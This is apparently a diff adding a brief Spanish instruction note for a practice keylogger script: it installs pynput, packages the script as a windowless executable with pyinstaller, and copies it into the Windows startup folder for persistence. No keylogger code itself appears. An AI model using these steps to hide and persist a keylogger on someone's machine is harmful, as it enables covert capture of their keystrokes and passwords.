@@ -1,0 +1,41 @@
+pip install pynput
+
+-leer el .py 
+
+Ejecutar el .py como sabeis para ver lo que hace
+
+
+
+
+
+
+
+
+
+
+pyinstaller --onefile --noconsole keylog_prac.py
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+ (Para crear el ejecutable)
+
+El ejecutable es tan sencillo como hacer doble click sobre el .exe que se crea en dist
+
+
+shell:startup en carpeta explorador para abrir carpeta. 
+
+Copiar archivo, disfrutar :D
